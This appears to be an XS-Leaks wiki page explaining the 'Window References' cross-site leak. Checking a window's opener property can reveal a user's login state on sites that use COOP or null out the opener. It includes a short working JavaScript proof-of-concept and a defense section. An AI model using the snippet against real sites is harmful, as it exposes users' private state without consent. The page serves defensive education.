+++
title = "Window References"
description = ""
date = "2020-10-08"
category = [
    "Attack",
]
abuse = [
    "Window References",
]
defenses = [
    "Fetch Metadata",
    "SameSite Cookies",
    "COOP"
]
menu = "main"
weight = 2
+++


If a page sets its `opener` property to `null` or is using [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) protection depending on the users' state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference. [Run demo](https://xsinator.com/testing.html#COOP%20Leak)

## Code Snippet
The below snippet demonstrates how to detect whether the `opener` property was set to `null`, or whether the [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) header is present with a value other than `unsafe-none`. This can be done with both iframes and new windows.

```javascript
// define the vulnerable URL
const v_url = 'https://example.org/profile';

const exploit = (url, new_window) => {
  let win;
  if(new_window){
    // open the url in a new tab to see if win.opener was affected by COOP
    // or set to null
    win = open(url);
  }else{
    // create an iframe to detect whether the opener is defined
    // won't work for COOP detection, or if a page has implemented framing protections
    document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks">'); 
    // redirect the iframe to the vulnerable URL
    win = open(url, "xsleaks");
  }
  
  // wait 2 seconds to let the page load
  setTimeout(() => {
    // check the opener property of the newly opened window
    if(!win.opener) console.log("win.opener is null");
    else console.log("win.opener is defined");
  }, 2000);
}
exploit(v_url);
exploit(v_url, 1);

```

## Defense

To mitigate this type of XS-Leak, be consistent across different pages: set the `opener` property to the same value on all pages using COOP. Using JavaScript to set `opener` to `null` can result in edge cases because it's possible to disable JavaScript entirely using iframe's sandbox attribute.
